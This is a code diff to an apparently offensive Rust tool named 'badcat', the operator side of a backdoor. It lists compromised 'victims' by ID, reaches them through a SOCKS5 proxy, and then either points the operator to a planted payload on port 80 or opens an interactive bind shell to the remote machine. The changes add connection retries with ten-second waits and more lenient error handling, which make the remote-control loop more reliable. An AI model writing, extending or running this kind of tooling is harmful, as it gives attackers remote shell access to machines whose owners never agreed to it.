@@ -4,7 +4,7 @@ extern crate clap;
 
 use std::io::Write;
 use std::net::TcpStream;
-use std::{error, io, path};
+use std::{error, io, path, thread, time};
 
 use badcat_lib::io::pipe_io;
 use clap::{App, Arg};
@@ -58,7 +58,7 @@ fn main() -> Result<(), Box<dyn error::Error>> {
             println!("`connect {{ TARGET_ID }}` - Connect to victim by ID. Example: connect 0");
         } else if command == "list" {
             for (index, setting) in settings.iter().enumerate() {
-                println!("{} {}  {}", index, &setting.address, &setting.uses_payload);
+                println!("{} {} {}  {}", index, &setting.name, &setting.uses_payload, &setting.address[..6]);
             }
         } else if command == "exit" {
             println!("fair well");
@@ -77,16 +77,19 @@ fn main() -> Result<(), Box<dyn error::Error>> {
                     if target_id < settings.len() {
                         let target = &settings[target_id];
 
-                        let stream = connect_to(&target, socks_address)?;
-
-                        if target.uses_payload {
-                            println!(
-                                "Your payload should be accessible now at: {}:80",
-                                target.address
-                            );
-                        } else {
-                            bind_shell(stream)?;
-                        }
+                        if let Ok(stream) = connect_to(&target, socks_address) {
+                            if target.uses_payload {
+                                println!(
+                                    "Your payload should be accessible now at: {}:80",
+                                    target.address
+                                );
+                            } else {
+                                bind_shell(stream).unwrap_or_else(|_| {
+                                    //
+                                });
+                                println!("connection closed.");
+                            }
+                        };
                     } else {
                         println!("ERROR: select an existing TARGET_ID");
                     }
@@ -105,16 +108,31 @@ fn connect_to(
     setting: &setting::Setting,
     socks_address: &str,
 ) -> Result<TcpStream, Box<dyn error::Error>> {
-    println!("trying to connect...");
+    let max_attempts = 5;
+    let mut attempt = 0;
 
-    let stream = Socks5Stream::connect(
-        socks_address,
-        String::from(format!("{}:80", &setting.address)).as_str(),
-    )?;
+    while attempt < max_attempts {
+        println!("trying to connect (attempt {})...", attempt);
 
-    println!("connected to: {:?}", stream.proxy_addr());
+        match Socks5Stream::connect(
+            socks_address,
+            String::from(format!("{}:80", &setting.address)).as_str(),
+        ) {
+            Ok(s) => {
+                println!("connected to: {:?}", s.proxy_addr());
+                return Ok(s.into_inner());
+            },
+            Err(error) => {
+                println!("problem connecting: {:?}", error);
+                println!("sleeping 10s...");
+                thread::sleep(time::Duration::from_secs(10));
+            }
+        };
 
-    Ok(stream.into_inner())
+        attempt += 1;
+    }
+
+    Err(format!("problem connecting to host: {:?}", &setting.address).into())
 }
 
 fn bind_shell(stream: TcpStream) -> Result<(), Box<dyn error::Error>> {
@@ -133,8 +151,6 @@ fn bind_shell(stream: TcpStream) -> Result<(), Box<dyn error::Error>> {
 
     // read from stdin, write to socket
     pipe_io(io::stdin(), stream_writer).join().unwrap();
-
-    println!("connection closed.");
 
     Ok(())
 }
